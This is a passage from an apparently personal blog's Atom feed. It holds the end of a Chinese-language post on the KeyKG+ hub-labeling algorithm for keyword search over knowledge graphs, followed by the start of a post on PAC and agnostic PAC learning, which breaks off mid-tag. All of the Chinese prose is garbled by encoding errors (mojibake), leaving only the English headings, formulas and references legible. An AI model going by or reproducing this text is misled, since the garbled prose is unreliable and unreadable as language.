4</figcaption></figure><p>åœ¨ç¬¬ä¸€éƒ¨åˆ†ï¼Œé¦–å…ˆï¼Œä¸º <span class="math inline">\(K_2,\dots,K_g\)</span> æ„é€ çŸ©é˜µ <span class="math inline">\(M\)</span> ï¼ˆLine 1-3ï¼‰ã€‚ç„¶åï¼ŒæŒ‰ç…§å¦‚ä¸‹æµç¨‹åˆ©ç”¨ <span class="math inline">\(M_{i-1}\)</span> æ‰¾åˆ° <span class="math inline">\(v_i\)</span> ï¼ˆLine 6ï¼‰ã€‚å¯¹äºæ¯ä¸€ä¸ª hub <span class="math inline">\(h_j\in L(v_1)\)</span> ï¼Œæˆ‘ä»¬ä» <span class="math inline">\(L(v_1)\)</span> ä¸­å–å¾— <span class="math inline">\(\textrm{dist}(v_1,h_j)\)</span> ï¼Œå¹¶ä¸”ä» <span class="math inline">\(M_{i-1}\)</span> ä¸­å– <span class="math inline">\(M_{i-1, j}\)</span> å…ƒç´ çš„ <span class="math inline">\(\textrm{dist}(M_{i-1,j},h_j)\)</span> ã€‚å¦‚æœ <span class="math inline">\(M_{i-1,j}\)</span> éç©ºï¼Œé‚£ä¹ˆæˆ‘ä»¬è®¡ç®—ï¼š <span class="math display">\[\textrm{dist}(v_1,h_j)+\textrm{dist}(M_{i-1,j},h_j)\]</span> è¿™ä¸ªç»“æœè¡¨ç¤ºäº† <span class="math inline">\(v_1\)</span> åˆ°åœ¨ <span class="math inline">\(K_i\)</span> ä¸­ç»è¿‡ä¸€ä¸ªç‰¹å®šçš„ <span class="math inline">\(h_j\)</span> æ‰€èƒ½åˆ°è¾¾çš„é¡¶ç‚¹ä¹‹é—´çš„æœ€çŸ­è·ç¦»ã€‚æœ€åï¼Œ é€šè¿‡å¦‚ä¸‹æ–¹å¼ï¼Œæ‰¾åˆ° <span class="math inline">\(v_i\)</span> ï¼š <span class="math display">\[v_i=\underset{M_{i-1, j}\; s.t.\; h_j\in L(v_1)\; \textrm{and}\; M_{i-1, j}\ne \textrm{null}}{\textrm{argmin}} \textrm{dist}(v_1,h_j)+\textrm{dist}(M_{i-1,j},h_j)\]</span> KeyKG+ Line 6 è®¡ç®—å¾—åˆ°çš„ <span class="math inline">\(v_i\)</span> å’Œ KeyKG Line 3 å¾—åˆ°çš„ <span class="math inline">\(v_i\)</span> ç­‰ä»·ï¼Œä½†æ˜¯ KeyKG+ çš„æ•ˆç‡æ›´é«˜ã€‚</p><p>ç¬¬äºŒéƒ¨åˆ†ï¼Œæˆ‘ä»¬åƒä¸º <span class="math inline">\(K_i\)</span> åˆ›å»º <span class="math inline">\(M_{i-1}\)</span> ä¸€æ ·ï¼Œä¸º <span class="math inline">\(V_{T_u}\)</span> ï¼ˆLine 14ï¼‰åˆ›å»º <span class="math inline">\(M&#39;_{u}\)</span> ã€‚éšç€ <span class="math inline">\(T_u\)</span> åœ¨æ¯æ¬¡è¿­ä»£ä¸­é€æ¸æ‰©å±•ï¼ˆLine 21ï¼‰ï¼Œ<span class="math inline">\(M&#39;_{u}\)</span> é€šè¿‡åŠ å…¥åˆ° <span class="math inline">\(T_u\)</span> çš„é¡¶ç‚¹çš„é™æ€ç´¢å¼•æ ‡ç­¾å¾—åˆ°æ›´æ–°ï¼ˆLine 22ï¼‰ã€‚å¯¹äºæ¯ä¸€ä¸ª <span class="math inline">\(t_i\in(U_x\backslash V_{T_u})\)</span> ï¼Œ<span class="math inline">\(M&#39;_u\)</span> è¢«ç”¨æ¥æ‰¾åˆ°ä¸ <span class="math inline">\(t_i\)</span> è·ç¦»æœ€çŸ­çš„é¡¶ç‚¹ <span class="math inline">\(s_i\in V_{T_u}\)</span> ï¼ˆLine 16-18ï¼‰ã€‚æˆ‘ä»¬åœ¨æ‰€æœ‰çš„è¿™æ ·çš„ <span class="math inline">\(&lt;s_i,t_i&gt;\)</span> ä¸­æ‰¾åˆ°æœ€å°çš„ <span class="math inline">\(&lt;s_{\textrm{min}},t_{\textrm{min}}&gt;\)</span> ï¼ˆLine 19ï¼‰</p><p>KeyKG+ Line 16-19 è®¡ç®—å¾—åˆ°çš„ <span class="math inline">\(&lt;s_{\textrm{min}},t_{\textrm{min}}&gt;\)</span> å’Œ KeyKG Line 12 å¾—åˆ°çš„ <span class="math inline">\(&lt;s_{\textrm{min}},t_{\textrm{min}}&gt;\)</span> ç­‰ä»·ï¼Œä½†æ˜¯ KeyKG+ çš„æ•ˆç‡æ›´é«˜ã€‚</p><h4 id="running-example-1">Running Example</h4><figure><img data-src="https://gitee.com/CosmosNing/MyPicGo/raw/master/images/2020/10/example-of-KeyKG.PNG" alt="KeyKG æ‰§è¡Œçš„ä¾‹å­" /><figcaption>KeyKG æ‰§è¡Œçš„ä¾‹å­</figcaption></figure><p>å¦‚ä¸Šå›¾ï¼Œ</p><ul><li>ä»¤ <span class="math inline">\(B\in K_1\)</span> ä¸º <span class="math inline">\(v_1\)</span> ï¼ŒæŸ¥è¯¢å…¶ Static HLï¼Œå¾—åˆ° <span class="math inline">\(L(B) = \{A,B\}\)</span> ï¼›<ul><li>å› ä¸º <span class="math inline">\(M_{1,A} = M_{1,B} = E\)</span> ï¼Œæ‰€ä»¥ä»¤ <span class="math inline">\(E\in K_2\)</span> ä¸º <span class="math inline">\(v_2\)</span> ï¼›</li><li>å› ä¸º <span class="math inline">\(M_{2,A} = C, M_{2,B} = \textrm{null}\)</span> ï¼Œæ‰€ä»¥ä»¤ <span class="math inline">\(C\in K_3\)</span> ä¸º <span class="math inline">\(v_3\)</span> ï¼›</li><li>è¿™æ ·å°±å½¢æˆäº† <span class="math inline">\(U_B=\{B,E,C\}\)</span> ï¼ˆè¿™ä¸ç®—æ³• KeyKG å¾—åˆ°çš„ç»“æœæ˜¯ä¸€è‡´çš„ï¼‰</li></ul></li><li>ä»¤ <span class="math inline">\(F\in K_1\)</span> ä¸º <span class="math inline">\(v_1\)</span> ï¼ŒæŸ¥è¯¢å…¶ Static HLï¼Œå¾—åˆ° <span class="math inline">\(L(F) = \{A,B,F\}\)</span> ï¼›<ul><li>å› ä¸º <span class="math inline">\(M_{1,A} = M_{1,B} = E, M_{1,F} = \textrm{null}\)</span> ï¼Œæ‰€ä»¥ä»¤ <span class="math inline">\(E\in K_2\)</span> ä¸º <span class="math inline">\(v_2\)</span> ï¼›</li><li>å› ä¸º <span class="math inline">\(M_{2,A} = C, M_{2,B} = M_{2,F} = \textrm{null}\)</span> ï¼Œæ‰€ä»¥ä»¤ <span class="math inline">\(C\in K_3\)</span> ä¸º <span class="math inline">\(v_3\)</span> ï¼›</li><li>è¿™æ ·å°±å½¢æˆäº† <span class="math inline">\(U_F=\{F,E,C\}\)</span> ï¼ˆè¿™ä¸ç®—æ³• KeyKG å¾—åˆ°çš„ç»“æœæ˜¯ä¸€è‡´çš„ï¼‰</li></ul></li></ul><div class="note default"><p><strong>TODO</strong>ï¼šå¦ä¸€åŠçš„ä¾‹å­æ€ä¹ˆè§£é‡Šï¼Ÿï¼Ÿï¼Ÿ</p></div><h1 id="how-much">How muchï¼Ÿ</h1><ul><li>åŸºäº <em>betweenness centrality</em> çš„å¯å‘å¼æ–¹æ³•æ„å»ºçš„ <em>Static Hub Labelings</em> è¶…è¶Šäº†ç°å­˜çš„æ–¹æ¡ˆã€‚</li><li><em>Dynamic Hub Labelings</em> åˆ™é€šè¿‡å€’æ’å¹¶èšé›†æŸ¥è¯¢ç›¸å…³çš„é™æ€æ ‡ç­¾ï¼ŒåŠ é€Ÿäº†æ€»ä½“çš„æŸ¥è¯¢æ•ˆç‡ã€‚</li></ul><h1 id="what-then">What Thenï¼Ÿ</h1><ul><li>å¯»æ‰¾æ”¯æŒæ›´é«˜æ•ˆåœ°è¾¹åˆ é™¤ï¼ˆ<em>edge deletion</em>ï¼‰çš„è§£å†³æ–¹æ¡ˆ</li><li>KeyKG+ çš„è¿‘ä¼¼æ¯”ç‡å¯ä»¥è¿›ä¸€æ­¥å¾—åˆ°æé«˜</li><li>ç°å­˜ HL æ–¹æ¡ˆæ— æ³•å¤„ç†å·¨å¤§è€Œç¨ å¯†çš„å›¾ã€‚</li></ul><h1 id="problems-to-solve">Problems to Solve</h1><ul><li><input type="checkbox" disabled="" />Hub Labeling<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a></li><li><input type="checkbox" disabled="" />pruned landmark labeling <a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a></li><li><input type="checkbox" disabled="" />PLL<a href="#fn3" class="footnote-ref" id="fnref3" role="doc-noteref"><sup>3</sup></a></li><li><input type="checkbox" disabled="" />between centralityï¼Ÿï¼Ÿï¼Ÿã€10ã€‘ <a href="#fn4" class="footnote-ref" id="fnref4" role="doc-noteref"><sup>4</sup></a> vs ã€4ã€‘<a href="#fn5" class="footnote-ref" id="fnref5" role="doc-noteref"><sup>5</sup></a></li></ul><section class="footnotes" role="doc-endnotes"><hr /><ol><li id="fn1" role="doc-endnote"><p>Ittai Abraham, Daniel Delling, Andrew V. Goldberg, and Renato Fonseca F. Werneck. 2011. A Hub-Based Labeling Algorithm for Shortest Paths in Road Networks. In SEA. 230â€“241.<a href="#fnref1" class="footnote-back" role="doc-backlink">â†©</a></p></li><li id="fn2" role="doc-endnote"><p>Takuya Akiba, Yoichi Iwata, and Yuichi Yoshida. 2013. Fast exact shortest-path distance queries on large networks by pruned landmark labeling. In SIGMOD. 349â€“360<a href="#fnref2" class="footnote-back" role="doc-backlink">â†©</a></p></li><li id="fn3" role="doc-endnote"><p>Takuya Akiba, Yoichi Iwata, and Yuichi Yoshida. 2013. Fast exact shortest-path distance queries on large networks by pruned landmark labeling. In SIGMOD. 349â€“360<a href="#fnref3" class="footnote-back" role="doc-backlink">â†©</a></p></li><li id="fn4" role="doc-endnote"><p>Ulrik Brandes. 2001. A faster algorithm for betweenness centrality. J. Math. Soc. 25, 2 (2001), 163â€“177.<a href="#fnref4" class="footnote-back" role="doc-backlink">â†©</a></p></li><li id="fn5" role="doc-endnote"><p>Ziyad AlGhamdi, Fuad Jamour, Spiros Skiadopoulos, and Panos Kalnis. 2017. A Benchmark for Betweenness Centrality Approximation Algorithms on Large Graphs. In SSDBM<a href="#fnref5" class="footnote-back" role="doc-backlink">â†©</a></p></li></ol></section>]]></content>
        <author>
            <name><![CDATA[CosmosNingçš„ä¸ªäººåšå®¢]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://cosmosning.github.io/2020/09/19/pac-learning-and-its-variants/</id>
        <title><![CDATA[PAC æ¨¡å‹åŠå…¶å˜ä½“]]></title>
        <updated>2021-05-14T12:17:25+08:00</updated>
        <link href="https://cosmosning.github.io/2020/09/19/pac-learning-and-its-variants/"/>
        <content type="text/html" src="https://cosmosning.github.io/2020/09/19/pac-learning-and-its-variants/"><![CDATA[<blockquote><p>æœ¬æ–‡å°†ä»‹ç»é€šç”¨çš„å­¦ä¹ æ¨¡å‹ PAC åŠå…¶å˜ä½“å½¢å¼ã€‚</p><ul><li><p>æœ€åŸå§‹çš„ PAC ä¸»è¦éœ€è¦æ»¡è¶³<strong>å¯å®ç°å‡è®¾</strong>ï¼Œ<strong>è®­ç»ƒæ ·æœ¬é‡è¦å¤§äºæ ·æœ¬å¤æ‚åº¦å‡½æ•°</strong>ã€‚</p></li><li><p>ç°å®æƒ…å†µä¸­ï¼Œ<strong>å¯å®ç°å‡è®¾éš¾ä»¥æ»¡è¶³</strong>ï¼ˆå…ˆéªŒçŸ¥è¯†ä¸ä¸€å®šçŒœå¾—å‡†ï¼‰ï¼Œå› æ­¤<strong>å°†ç›®æ ‡æ ‡è®°å‡½æ•°æ”¹ä¸ºæ•°æ®-æ ‡ç­¾åˆ†å¸ƒï¼Œå¹¶ä»ä¸­é‡‡æ ·è®­ç»ƒæ ·æœ¬</strong>ï¼Œå°±å¯ä»¥ç±»ä¼¼çš„å¾—åˆ° Agnostic PAC ã€‚</p></li><li><p>åŸå§‹çš„ PAC ä¸­ï¼Œæ ‡è®°å‡½æ•°å°†å­¦ä¹ é—®é¢˜é™åˆ¶åœ¨äºŒå…ƒåˆ†ç±»ä»»åŠ¡ä¸­ã€‚ä¸ºäº†è·å¾—æ›´åŠ é€šç”¨çš„å­¦ä¹ æ¨¡å‹ï¼Œæˆ‘ä»¬å®šä¹‰æ›´åŠ ä¸€èˆ¬çš„æŸå¤±å‡½æ•°ã€‚é€šè¿‡æŸå¤±å‡½æ•°ï¼Œå¯è®¡ç®—çœŸå®è¯¯å·®å’Œç»éªŒé£é™©ï¼š</p></li></ul><blockquote><ul><li><p>åœ¨<strong>é—®é¢˜åˆ†å¸ƒ</strong>ï¼ˆ<span class="math inline">\(\mathcal{D}\)</span>ï¼‰ä¸Šé‡‡æ ·å¾—åˆ°çš„è¯¯å·®å‡½æ•°çš„<strong>æœŸæœ›</strong>ï¼Œä½œä¸º<strong>çœŸå®è¯¯å·®</strong>ï¼›</p></li><li><p>åœ¨<strong>è®­ç»ƒæ ·æœ¬</strong>ï¼ˆ<span class="math inline">\(S\)</span>ï¼‰ä¸Šé‡‡æ ·å¾—åˆ°çš„è¯¯å·®å‡½æ•°çš„<strong>å¹³å‡å€¼</strong>ï¼Œä½œä¸º<strong>ç»éªŒé£é™©</strong>ï¼›</p></li></ul></blockquote></blockquote><h1 id="pac-learning">PAC Learning</h1><p>åœ¨<a href="/2020/09/16/statistical-learning-framework-and-empirical-risk-minimization/">ä¸Šä¸€ç¯‡æ–‡ç« </a>ä¸­ï¼Œæˆ‘ä»¬è¯æ˜äº†å¯¹äºä¸€ä¸ªæœ‰é™çš„å‡è®¾é›†ï¼Œ<mark>å¦‚æœæ‹¥æœ‰è¶³é‡çš„è®­ç»ƒæ ·æœ¬ï¼ˆè¿™äº›è®­ç»ƒæ ·æœ¬æ˜¯ä»åŒä¸€åˆ†å¸ƒä¸­ç‹¬ç«‹é‡‡æ ·ï¼Œå¹¶è¢«åŒä¸€æ ‡è®°å‡½æ•°æ ‡è®°è€Œç”Ÿæˆçš„ï¼‰ï¼ŒERM ä¼šè¾“å‡ºè¿‘ä¼¼æ­£ç¡®çš„å‡è®¾</mark>ã€‚æ›´ä¸€èˆ¬çš„ï¼Œæˆ‘ä»¬å®šä¹‰ <em>Probably Approximately Correct Learning</em> ï¼ˆPACï¼‰å¦‚ä¸‹ï¼š</p><div class="note primary"><p><strong>Def. PAC Learnability</strong></p><p>å¦‚æœ</p><ul><li>å­˜åœ¨ä¸€ä¸ªå‡½æ•° <span class="math inline">\(m_{\mathcal{H}}:(0,1)^2\rightarrow \mathbb{N}\)</span> ï¼Œ</li><li>å¹¶ä¸”å­˜åœ¨ä¸€ä¸ªå­¦ä¹ ç®—æ³•æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š<ul><li>å¯¹äºä»»æ„çš„ <span class="math inline">\(\epsilon, \delta\in(0,1)\)</span> ï¼Œä»»æ„çš„ <span class="math inline">\(\mathcal{X}\)</span> ä¸Šçš„åˆ†å¸ƒ <span class="math inline">\(\mathcal{D}\)</span> ï¼Œä»»æ„çš„æ ‡è®°å‡½æ•° <span class="math inline">\(f: \mathcal{X}\rightarrow \lbrace 0,1\rbrace\)</span> ï¼Œå¦‚æœå¯¹äº <span class="math inline">\(\mathcal{H,D},f\)</span> å¯å®ç°å‡è®¾ï¼ˆ<em>realizability assumption</em> ï¼Œå³ <span class="math inline">\(\exists\ h^\star\in \mathcal{H}, L_{D,f}(h^\star) = 0\)</span>ï¼‰æˆç«‹ï¼Œé‚£ä¹ˆå½“å­¦ä¹ ç®—æ³•çš„è®­ç»ƒæ ·æœ¬é‡ <span class="math inline">\(m \ge m_{\mathcal{H}}(\epsilon, \delta)\)</span> æ—¶ï¼ˆè¿™äº›è®­ç»ƒæ ·æœ¬æ˜¯ç”±ä» <span class="math inline">\(\mathcal{D}\)</span> ä¸­ç‹¬ç«‹é‡‡æ ·ï¼Œå¹¶è¢« <span class="math inline">\(f\)</span> æ ‡è®°è€Œç”Ÿæˆçš„ï¼‰ï¼Œå­¦ä¹ ç®—æ³•ä¼šä»¥è‡³å°‘ <span class="math inline">\(1 - \delta\)</span> çš„æ¦‚ç‡è¿”å›ä¸€ä¸ªå‡è®¾ <span class="math inline">\(h\)</span>ï¼Œå¹¶ä¸”è¯¥å‡è®¾æ»¡è¶³ <span class="math inline">\(L_{(\mathcal{D},f)}(h) \le \epsilon\)</span></li></ul></li></ul><p>åˆ™ä¸€ä¸ªå‡è®¾ç±» <span class="math inline">\(\mathcal{H}\)</span> æ˜¯ PAC å¯å­¦ä¹ çš„</p></div><div class="note info"><p><strong>æœ‰å…³ PAC Learnability çš„è¡¥å……è¯´æ˜</strong></p><ul><li><span class="math inline">\(\epsilon\)</span> ç§°ä½œ<strong>ç²¾åº¦å‚æ•°</strong>ï¼ˆ<em>accuracy parameter</em>ï¼‰ï¼Œä»£è¡¨è¾“å‡ºåˆ†ç±»å™¨ä¸æœ€ä¼˜ä¹‹é—´çš„è¯¯å·®å¤§å°ï¼ˆå¯¹åº” PAC ä¸­çš„ <strong><em>approximately correct</em></strong>ï¼‰ã€‚è¿™æ„å‘³ç€ï¼Œ<span class="math inline">\(\epsilon\)</span> å…è®¸å­¦ä¹ ç®—æ³•çŠ¯ä¸€äº›å°é”™è¯¯ã€‚</li><li><span class="math inline">\(\delta\)</span> ç§°ä½œ<strong>ç½®ä¿¡å‚æ•°</strong>ï¼ˆ<em>confidence parameter</em>ï¼‰ï¼Œä»£è¡¨è¾“å‡ºåˆ†ç±»å™¨æ»¡è¶³ä¸Šè¿°ç²¾åº¦è¦æ±‚çš„å¯èƒ½æ€§ï¼ˆå¯¹åº” PAC ä¸­çš„ <strong><em>probably</em></strong>ï¼‰</li><li><span class="math inline">\(m_{\mathcal{H}}:(0, 1) \rightarrow \mathbb{N}\)</span> ç§°ä½œ<strong>æ ·æœ¬å¤æ‚åº¦</strong>ï¼ˆ<em>sample complexity</em>ï¼‰å‡½æ•°ï¼Œè¡¨ç¤º<strong>éœ€è¦å¤šå°‘è®­ç»ƒæ ·æœ¬æ•°æ®ï¼Œæ‰èƒ½å¤Ÿä¿è¯è·å¾—ä¸€ä¸ªå°½å¯èƒ½è¿‘ä¼¼æ­£ç¡®çš„ç­”æ¡ˆ</strong>ã€‚è¯¥å‡½æ•°ä¾èµ–äº <span class="math inline">\(\epsilon, \delta,\mathcal{H}\)</span> ã€‚ä¾æ® PAC Learnability çš„å®šä¹‰ï¼Œå­˜åœ¨ä¸æ­¢ä¸€ä¸ª <span class="math inline">\(m_{\mathcal{H}}\)</span> æ»¡è¶³æ¡ä»¶ã€‚é€šå¸¸ï¼Œæˆ‘ä»¬å®šä¹‰ <span class="math inline">\(m_{\mathcal{H}}\)</span> ä¸ºæ»¡è¶³æ¡ä»¶çš„<strong>æœ€å°æ•´æ•°</strong>ã€‚</li></ul></div><p>å¯¹ä¸Šä¸€ç¯‡æ–‡ç« ä¸­è·å¾—çš„ç»“è®ºï¼Œæˆ‘ä»¬æ¢ä¸€ç§è¡¨è¾¾ï¼Œåˆ™æœ‰ä¸‹é¢çš„æ¨è®º</p><div class="note default"><p><strong>PAC å¯å­¦ä¹ çš„æ ·æœ¬å¤æ‚åº¦æ¡ä»¶</strong></p><p>æ¯ä¸€ä¸ªæœ‰é™å‡è®¾ç±»éƒ½æ˜¯ PAC å¯å­¦ä¹ çš„ï¼Œåªè¦å®ƒçš„æ ·æœ¬å¤æ‚åº¦æ»¡è¶³ï¼š <span class="math display">\[m_{\mathcal{H}} \le \lceil \frac{log(\frac{\mathcal{H}}{\delta})}{\epsilon} \rceil\]</span></p></div><h1 id="a-more-general-learning-model">A More General Learning Model</h1><p>å¯¹äºå¤§å¤šæ•°ä»»åŠ¡ï¼Œå¯å®ç°å‡è®¾å¾ˆéš¾å¾—åˆ°æ»¡è¶³ï¼Œè€Œä¸”ä¸Šè¿°å®šä¹‰åªé€‚ç”¨äºäºŒå…ƒåˆ†ç±»é—®é¢˜ï¼Œå› æ­¤é€šç”¨æ€§ä¸ä½³ã€‚ä¸ºäº†å¾—åˆ°æ›´åŠ é€šç”¨çš„å­¦ä¹ æ¨¡å‹ï¼Œæˆ‘ä»¬å¯¹ä¸Šè¿°æ¨¡å‹ä»ä»¥ä¸‹ä¸¤ä¸ªæ–¹é¢è¿›è¡Œæ‹“å±•ï¼š</p><ol type="1"><li>å»é™¤å¯å®ç°å‡è®¾ã€‚å¼•å…¥ <strong>Agnostic PAC</strong> è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</li><li>å­¦ä¹ æ¯”äºŒå…ƒåˆ†ç±»é—®é¢˜æ›´åŠ å¹¿æ³›çš„ä»»åŠ¡ã€‚é€šè¿‡å¯¹<strong>æŸå¤±å‡½æ•°çš„ä¸€èˆ¬åŒ–</strong>æ¥æ”¯æŒè¿™ç§æ‹“å±•ã€‚</li></ol><h2 id="releasing-the-realizablity-assumption-agnostic-pac-learning">Releasing the Realizablity Assumption â€”â€” Agnostic PAC Learning</h2><h3 id="a-more-realistic-model-for-the-data-generating-distribution">A More Realistic Model for the Data-Generating Distribution</h3><p>ç®€å•æ¥è¯´ï¼Œæˆ‘ä»¬å¯ä»¥å°† â€œç›®æ ‡æ ‡è®°å‡½æ•°â€ æ›¿æ¢ä¸º<strong>æ•°æ®-æ ‡ç­¾</strong>ç”Ÿæˆåˆ†å¸ƒã€‚</p><p>è§„èŒƒåœ°ï¼Œè®¾ <span class="math inline">\(\mathcal{D}\)</span> ä¸º <span class="math inline">\(\mathcal{X} \times \mathcal{Y}\)</span> ä¸Šçš„æ¦‚ç‡åˆ†å¸ƒï¼Œå…¶ä¸­ <span class="math inline">\(\mathcal{X}\)</span> ä¸ºé¢†åŸŸé›†ï¼Œ<span class="math inline">\(\mathcal{Y}\)</span> ä¸ºæ ‡ç­¾é›†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œ<span class="math inline">\(\mathcal{D}\)</span> ä¸ºåœ¨é¢†åŸŸç‚¹å’Œæ ‡ç­¾ä¸Šçš„è”åˆåˆ†å¸ƒã€‚æˆ‘ä»¬å¯ä»¥å°† <span class="math inline">\(\mathcal{D}\)</span> çœ‹ä½œç”±ä¸¤ä¸ªéƒ¨åˆ†ç»„æˆï¼šä¸€ä¸ªåœ¨æœªè¢«æ ‡è®°çš„é¢†åŸŸç‚¹ä¸Šçš„åˆ†å¸ƒ <span class="math inline">\(\mathcal{D}_x\)</span> ï¼ˆæœ‰æ—¶å€™ï¼Œä¹Ÿç§°ä½œ<strong>è¾¹ç¼˜åˆ†å¸ƒ</strong>ï¼‰ ï¼Œå¦ä¸€ä¸ªä¸ºæ¯ä¸€ä¸ªé¢†åŸŸç‚¹çš„æ ‡ç­¾ä¸Šçš„<strong>æ¡ä»¶æ¦‚ç‡</strong> <span class="math inline">\(\mathcal{D}((x,y)|x)\)</span> ã€‚</p><div class="note info"><p><strong>å¦‚ä½•ç†è§£æ¡ä»¶æ¦‚ç‡ï¼Ÿ</strong></p><ul><li>å¾ˆå¤šäº‹æƒ…æ— æ³•ç²¾ç¡®åˆ»ç”»ï¼Œå› æ­¤å¯ç”¨ä¸€ä¸ªæ¡ä»¶åˆ†å¸ƒæ¥æè¿°ã€‚éšç€æŸä¸€å˜é‡çš„å˜åŒ–ï¼Œå¯¹åº”äº‹ä»¶çš„æ¦‚ç‡ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ã€‚ä¾‹å¦‚ï¼Œ<span class="math inline">\(\mathcal{D}(y|x)\)</span> äº‹ä»¶ <span class="math inline">\(y\)</span> çš„æ¦‚ç‡ä¼šéšç€ <span class="math inline">\(x\)</span> çš„å˜åŒ–è€Œå˜åŒ–ï¼›æ­¤å¤–ï¼Œåœ¨ <span class="math inline">\(\mathcal{D}(y|x)\)</span> ä¸­ï¼Œ<span class="math inline">\(\mathcal{D}(y|x)\)</span> æ˜¯å…³äº <span class="math inline">\(y\)</span> çš„å‡½æ•°ï¼Œè€Œ <span class="math inline">\(x\)</span> æ˜¯ä½œä¸ºå‡½æ•°çš„å‚æ•°ï¼ˆå¦‚æœè¦ç¡®å®šå…³äº <span class="math inline">\(y\)</span> çš„å‡½æ•°å…³ç³»ï¼Œ<span class="math inline">\(x\)</span> è¦äº‹å…ˆæŒ‡å®šï¼‰ã€‚</li></ul></div><h3 id="the-empirical-and-true-error-revised">The Empirical and True Error Revised</h3><p>ä¸åˆ†å¸ƒçš„æ”¹å˜ç›¸å¯¹åº”ï¼Œæˆ‘ä»¬å®šä¹‰é¢„æµ‹è§„åˆ™ <span class="math inline">\(h\)</span> <strong>çœŸå®è¯¯å·®</strong>ï¼ˆæˆ–è€…å«åš<strong>é£é™©</strong>ï¼‰å¦‚ä¸‹ï¼š <span class="math display">\[L_{\mathcal{D}}\overset{def}{=}\underset{(x,y)\sim \mathcal{D}}{\mathbb{P}}[h(x)\ne y] \overset{def}{=}\mathcal{D}(\lbrace (x,y): h(x) \ne y \rbrace) \tag{3.1}\]</span> è€Œç»éªŒé£é™©å¹¶æ²¡æœ‰æ”¹å˜ï¼Œä¾ç„¶æ˜¯ï¼š <span class="math display">\[L_{S}(h)\overset{def}{=}\frac{|\lbrace i\in[m] : h(x_i) \ne y_i \rbrace|}{m}\]</span></p><h3 id="the-goal">The Goal</h3><p>å­¦ä¹ ç®—æ³•çš„ç›®æ ‡æ˜¯å¯»æ‰¾ä¸€äº›å‡è®¾ï¼Œ<span class="math inline">\(h:\mathcal{X}\rightarrow \mathcal{Y}\)</span> ï¼Œå°½å¯èƒ½è¿‘ä¼¼æœ€å°åŒ–çœŸå®é£é™©ï¼Œ<span class="math inline">\(L_{\mathcal{D}}(h)\)</span></p><h3 id="the-bayes-optimal-predictor">The Bayes Optimal Predictor</h3><p>ç»™å®šä»»æ„çš„åœ¨ <span class="math inline">\(\mathcal{X} \times \lbrace 0,1\rbrace\)</span> ä¸Šçš„æ¦‚ç‡åˆ†å¸ƒï¼Œä» <span class="math inline">\(\mathcal{X}\)</span> åˆ° <span class="math inline">\(\lbrace 0, 1 \rbrace\)</span> çš„æœ€ä½³æ ‡è®°å‡½æ•°ä¸º <span class="math display">\[f_{\mathcal{D}}(x) = \begin{cases} 1 &amp;if\ \mathbb{P}[y=1|x]\ge \frac{1}{2}\\ 0 &amp; otherwise\end{cases}\]</span> è¿™ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯¹äºä»»æ„çš„äºŒå…ƒåˆ†ç±»å™¨ <span class="math inline">\(g: \mathcal{X}\rightarrow \lbrace 0, 1\rbrace\)</span>ï¼Œ<span class="math inline">\(L_{\mathcal{D}}(f_{\mathcal{D}}) \le L_{\mathcal{D}}(g)\)</span></p><div class="note info"><p><strong>è¯æ˜ The Bayes Optimal Predictor</strong>ï¼ˆTODOï¼‰</p></div><p>ä¸€æ—¦æˆ‘ä»¬å¯¹æ•°æ®ç”Ÿæˆåˆ†å¸ƒä¸åšä»»ä½•é¢„å…ˆå‡è®¾ï¼Œé‚£ä¹ˆå°†æ²¡æœ‰ç®—æ³•å°†ä¿è¯æ‰¾åˆ°ä¸€ä¸ªé¢„æµ‹å™¨ï¼Œåª²ç¾ Bayes Optimal Predictor çš„æ•ˆæœã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦å­¦ä¹ ç®—æ³•æ‰¾åˆ°ä¸€ä¸ªé¢„æµ‹å™¨ï¼Œåœ¨ç»™å®šæŸäº›å‡è®¾ç±»çš„åŸºå‡†æµ‹è¯•æ—¶ï¼Œ<strong>å®ƒçš„è¯¯å·®å¹¶ä¸ä¼šæ¯”å¯èƒ½çš„æœ€ä½³çš„é¢„æµ‹å™¨çš„è¯¯å·®å¤§å¤ªå¤š</strong>ã€‚å› æ­¤ï¼Œæˆ‘ä»¬æœ‰å¦‚ä¸‹çš„ <strong>Agnostic PAC Learnability</strong>ï¼š</p><div class="note primary"><p><strong>Def. Agnostic PAC Learnability</strong></p><p>å¦‚æœ</p><ul><li><p>å­˜åœ¨ä¸€ä¸ªå‡½æ•° <span class="math inline">\(m_{\mathcal{H}}:(0,1)^2\rightarrow \mathbb{N}\)</span> ï¼Œ</p></li><li><p>å¹¶ä¸”å­˜åœ¨ä¸€ä¸ªå­¦ä¹ ç®—æ³•æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p><ul><li>å¯¹äºä»»æ„çš„ <span class="math inline">\(\epsilon, \delta\in(0,1)\)</span> ï¼Œä»»æ„çš„ <span class="math inline">\(\mathcal{X} \times\mathcal{Y}\)</span> ä¸Šçš„åˆ†å¸ƒ <span class="math inline">\(\mathcal{D}\)</span> ï¼Œå½“å­¦ä¹ ç®—æ³•çš„è®­ç»ƒæ ·æœ¬é‡ <span class="math inline">\(m \ge m_{\mathcal{H}}(\epsilon, \delta)\)</span> æ—¶ï¼ˆè¿™äº›è®­ç»ƒæ ·æœ¬æ˜¯ç”±ä» <span class="math inline">\(\mathcal{D}\)</span> ä¸­ç‹¬ç«‹é‡‡æ ·è€Œç”Ÿæˆçš„ï¼‰ï¼Œå­¦ä¹ ç®—æ³•ä¼šä»¥è‡³å°‘ <span class="math inline">\(1 - \delta\)</span> çš„æ¦‚ç‡è¿”å›ä¸€ä¸ªå‡è®¾ <span class="math inline">\(h\)</span>ï¼Œå¹¶ä¸”è¯¥å‡è®¾æ»¡è¶³ï¼š <span class="math display">\[L_{\mathcal{D}}(h) \le \underset{h&#39;\in\mathcal{H}}{min}L_D(h&#39;) + \epsilon\]</span></li></ul></li></ul><p>åˆ™ä¸€ä¸ªå‡è®¾ç±» <span class="math inline">\(\mathcal{H}\)</span> æ˜¯ Agnostic PAC å¯å­¦ä¹ çš„</p></div><h2 